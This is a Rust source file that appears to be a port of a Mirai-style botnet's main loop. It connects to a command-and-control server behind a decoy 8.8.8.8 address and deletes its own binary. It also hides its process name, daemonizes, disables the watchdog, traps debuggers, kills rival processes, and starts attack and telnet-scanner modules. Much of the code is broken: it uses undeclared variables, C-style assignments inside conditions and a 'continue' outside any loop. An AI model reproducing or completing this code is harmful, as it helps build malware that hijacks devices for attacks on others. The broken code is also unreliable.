use std::fs;
use std::io::{self, Write};
use std::net::{SocketAddr, TcpStream, UdpSocket};
use std::os::unix::io::AsRawFd;
use std::process::{self, Command};
use std::ptr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use libc::{kill, setsockopt, socklen_t, sockaddr_in, AF_INET, IPPROTO_TCP, O_NONBLOCK, SIGINT, SIGSEGV, SOCK_STREAM, SOL_SOCKET, SO_ERROR, SO_REUSEADDR};
use nix::fcntl::{fcntl, FcntlArg, OFlag};
use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
use nix::unistd::{close, fork, ForkResult, getpid, setsid};
use rand::Rng;

use crate::attack::attack_init;
use crate::killer::{killer_init, killer_kill, killer_kill_by_port};
use crate::rand::{rand_alphastr, rand_init, rand_next};
use crate::resolv::resolv_lookup;
use crate::scanner::{scanner_init, scanner_kill};
use crate::table::{table_init, table_lock_val, table_retrieve_val, table_unlock_val};
use crate::util::{util_local_addr, util_memcpy, util_strcmp, util_strlen, util_zero};

static mut FD_CTRL: i32 = -1;
static mut FD_SERV: i32 = -1;
static mut PENDING_CONNECTION: AtomicBool = AtomicBool::new(false);
static mut LOCAL_ADDR: u32 = 0;

const SINGLE_INSTANCE_PORT: u16 = 1000; // replace with actual port
const FAKE_CNC_ADDR: u32 = 0x08080808; // 8.8.8.8 in hexadecimal
const FAKE_CNC_PORT: u16 = 80;

fn main() {
    let mut args: Vec<String> = std::env::args().collect();
    let id_buf = if args.len() == 2 && args[1].len() < 32 {
        let id = args[1].clone();
        args[1].clear();
        id
    } else {
        String::new()
    };

    // Handle SIGSEGV
    unsafe {
        let sa = SigAction::new(SigHandler::SigAction(segv_handler), SaFlags::SA_SIGINFO, SigSet::empty());
        sigaction(Signal::SIGSEGV, &sa).unwrap();
        sigaction(Signal::SIGBUS, &sa).unwrap();
    }

    // Delete self
    if !cfg!(debug_assertions) {
        let _ = fs::remove_file(&args[0]);
    }

    // Setup process
    if !cfg!(debug_assertions) {
        setup_process();
    }

    // Initialize
    unsafe {
        LOCAL_ADDR = util_local_addr();
    }

    // Setup server address
    let mut srv_addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: FAKE_CNC_PORT.to_be(),
        sin_addr: libc::in_addr { s_addr: FAKE_CNC_ADDR },
        sin_zero: [0; 8],
    };

    // Set up control and server connections
    ensure_single_instance();

    unsafe {
        rand_init();
    }

    // Setup hidden process name
    hide_process_name(&mut args[0]);

    // Print execution success
    print_exec_success();

    // Fork into the background
    if !cfg!(debug_assertions) {
        if let ForkResult::Parent { .. } = fork().expect("Fork failed") {
            return;
        }
        let pgid = setsid().unwrap();
        close(0);
        close(1);
        close(2);
    }

    attack_init();
    killer_init();
    if cfg!(feature = "telnet_scanner") {
        scanner_init();
    }

    // Main loop
    loop {
        main_loop();
    }
}

unsafe fn setup_process() {
    // Block signals and ignore child termination signals
    let mut sigs = SigSet::empty();
    sigs.add(Signal::SIGINT);
    sigprocmask(SigmaskHow::SIG_BLOCK, Some(&sigs), None).unwrap();
    signal(Signal::SIGCHLD, SigHandler::SigIgn);

    // Anti-debugging measures
    signal(Signal::SIGTRAP, SigHandler::Handler(anti_gdb_entry));

    // Disable watchdog
    if let Ok(mut wfd) = fs::OpenOptions::new().write(true).open("/dev/watchdog") {
        let _ = wfd.write(&[1]);
        let _ = wfd.flush();
    }
}

extern "C" fn segv_handler(sig: i32, info: *mut libc::siginfo_t, _context: *mut libc::c_void) {
    println!("Got SIGSEGV at address: {:?}", info);
    process::exit(1);
}

fn hide_process_name(argv0: &mut String) {
    let mut rng = rand::thread_rng();
    let name_buf_len = ((rng.gen::<usize>() % 4) + 3) * 4;
    let name_buf = rand_alphastr(name_buf_len);
    argv0.clear();
    argv0.push_str(&name_buf);

    // Hide process name
    let name_buf_len = ((rng.gen::<usize>() % 6) + 3) * 4;
    let name_buf = rand_alphastr(name_buf_len);
    prctl::set_name(&name_buf).unwrap();
}

fn print_exec_success() {
    table_unlock_val(crate::table::TABLE_EXEC_SUCCESS);
    let tbl_exec_succ = table_retrieve_val(crate::table::TABLE_EXEC_SUCCESS, None);
    io::stdout().write_all(tbl_exec_succ.as_bytes()).unwrap();
    io::stdout().write_all(b"\n").unwrap();
    table_lock_val(crate::table::TABLE_EXEC_SUCCESS);
}

fn main_loop() {
    let mut fdsetrd = nix::sys::select::FdSet::new();
    let mut fdsetwr = nix::sys::select::FdSet::new();
    let mut fdsetex = nix::sys::select::FdSet::new();
    let timeo = libc::timeval { tv_sec: 10, tv_usec: 0 };
    let mfd: i32;

    unsafe {
        if FD_CTRL != -1 {
            fdsetrd.insert(FD_CTRL);
        }

        if FD_SERV == -1 {
            establish_connection();
        }

        if PENDING_CONNECTION.load(Ordering::Relaxed) {
            fdsetwr.insert(FD_SERV);
        } else {
            fdsetrd.insert(FD_SERV);
        }

        mfd = std::cmp::max(FD_CTRL, FD_SERV);

        let nfds = select(mfd + 1, &mut fdsetrd, &mut fdsetwr, &mut fdsetex, &timeo);
        if nfds == -1 {
            continue;
        } else if nfds == 0 {
            // Send ping
            continue;
        }

        // Handle control connection
        if FD_CTRL != -1 && fdsetrd.contains(FD_CTRL) {
            // Handle new instance detection
            handle_new_instance();
        }

        // Handle CNC connection
        if PENDING_CONNECTION.load(Ordering::Relaxed) {
            handle_cnc_connection();
        } else if FD_SERV != -1 && fdsetrd.contains(FD_SERV) {
            handle_cnc_read();
        }
    }
}

unsafe fn handle_new_instance() {
    let mut cli_addr: sockaddr_in = std::mem::zeroed();
    let mut cli_addr_len = std::mem::size_of::<sockaddr_in>() as socklen_t;

    accept(FD_CTRL, &mut cli_addr as *mut _ as *mut _, &mut cli_addr_len);

    killer_kill();
    if cfg!(feature = "telnet_scanner") {
        scanner_kill();
    }
    kill(FD_CTRL, 9);
    process::exit(0);
}

unsafe fn handle_cnc_connection() {
    PENDING_CONNECTION.store(false, Ordering::Relaxed);

    if fdsetwr.contains(FD_SERV) {
        let mut err: libc::c_int = 0;
        let mut err_len = std::mem::size_of::<libc::c_int>() as socklen_t;
        getsockopt(FD_SERV, SOL_SOCKET, SO_ERROR, &mut err as *mut _ as *mut _, &mut err_len);

        if err != 0 {
            teardown_connection();
        } else {
            let id_len = id_buf.len();
            send(FD_SERV, "\x00\x00\x00\x01".as_bytes(), MSG_NOSIGNAL);
            send(FD_SERV, &(id_len as u8), 1, MSG_NOSIGNAL);
            if !id_buf.is_empty() {
                send(FD_SERV, id_buf.as_bytes(), MSG_NOSIGNAL);
            }
        }
    } else {
        teardown_connection();
    }
}

unsafe fn handle_cnc_read() {
    let mut len: u16 = 0;
    let mut rdbuf = [0u8; 1024];
    let n = recv(FD_SERV, &mut len as *mut _ as *mut _, std::mem::size_of_val(&len), MSG_NOSIGNAL | MSG_PEEK);
    if n <= 0 {
        teardown_connection();
        return;
    }

    len = u16::from_be(len);
    if len == 0 {
        recv(FD_SERV, &mut len as *mut _ as *mut _, std::mem::size_of_val(&len), MSG_NOSIGNAL);
        return;
    }

    let n = recv(FD_SERV, &mut rdbuf as *mut _ as *mut _, len as usize, MSG_NOSIGNAL);
    if n <= 0 {
        teardown_connection();
        return;
    }

    attack_parse(&rdbuf, n as usize);
}

unsafe fn establish_connection() {
    if (FD_SERV = socket(AF_INET, SOCK_STREAM, 0)) == -1 {
        return;
    }

    let flags = fcntl(FD_SERV, FcntlArg::F_GETFL).unwrap();
    fcntl(FD_SERV, FcntlArg::F_SETFL(OFlag::from_bits_truncate(flags | O_NONBLOCK))).unwrap();

    // Set CNC address
    if let Some(resolve_func) = resolve_func {
        resolve_func();
    }

    PENDING_CONNECTION.store(true, Ordering::Relaxed);
    connect(FD_SERV, &srv_addr as *const _ as *const _, std::mem::size_of_val(&srv_addr) as socklen_t);
}

unsafe fn teardown_connection() {
    if FD_SERV != -1 {
        close(FD_SERV);
        FD_SERV = -1;
    }
}

unsafe fn ensure_single_instance() {
    static mut LOCAL_BIND: bool = true;
    let mut addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_addr: libc::in_addr { s_addr: if LOCAL_BIND { INET_ADDR(127, 0, 0, 1) } else { LOCAL_ADDR } },
        sin_port: SINGLE_INSTANCE_PORT.to_be(),
        sin_zero: [0; 8],
    };

    if (FD_CTRL = socket(AF_INET, SOCK_STREAM, 0)) == -1 {
        return;
    }
    setsockopt(FD_CTRL, SOL_SOCKET, SO_REUSEADDR, &1 as *const _ as *const _, std::mem::size_of_val(&1) as socklen_t);
    fcntl(FD_CTRL, FcntlArg::F_SETFL(OFlag::O_NONBLOCK)).unwrap();

    if bind(FD_CTRL, &addr as *const _ as *const _, std::mem::size_of_val(&addr) as socklen_t) == -1 {
        LOCAL_BIND = false;
        sleep(5);
        close(FD_CTRL);
        killer_kill_by_port(SINGLE_INSTANCE_PORT);
        ensure_single_instance();
    } else {
        if listen(FD_CTRL, 1) == -1 {
            close(FD_CTRL);
            sleep(5);
            killer_kill_by_port(SINGLE_INSTANCE_PORT);
            ensure_single_instance();
        }
    }
}

fn unlock_tbl_if_nodebug(argv0: &str) -> bool {
    let buf_src = [
        0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00
    ];
    let mut buf_dst = [0; 12];
    let mut ii = 0;
    let fold = 0xAF;

    for i in (0..7).step_by(3) {
        buf_dst[ii] = buf_src[i + 1];
        buf_dst[ii + 1] = buf_src[i];

        ii += 2;
    }

    let fold = fold.wrapping_add(!argv0.chars().nth(ii % argv0.len()).unwrap() as u8);
    let fold = fold % (std::mem::size_of_val(&obf_funcs) / std::mem::size_of::<fn()>() as usize);

    if !cfg!(debug_assertions) {
        (obf_funcs[fold])();
        util_strcmp(argv0, &buf_dst)
    } else {
        table_init();
        true
    }
}

fn anti_gdb_entry(_sig: i32) {
    resolve_func = Some(resolve_cnc_addr);
}

fn resolve_cnc_addr() {
    if let Some(entries) = resolv_lookup(table_retrieve_val(crate::table::TABLE_CNC_DOMAIN, None)) {
        srv_addr.sin_addr.s_addr = entries.addrs[rand_next() as usize % entries.addrs_len as usize];
        table_lock_val(crate::table::TABLE_CNC_DOMAIN);
        table_lock_val(crate::table::TABLE_CNC_PORT);
        table_lock_val(crate::table::TABLE_CNC_DOMAIN);
        table_lock_val(crate::table::TABLE_CNC_PORT);
    }
}
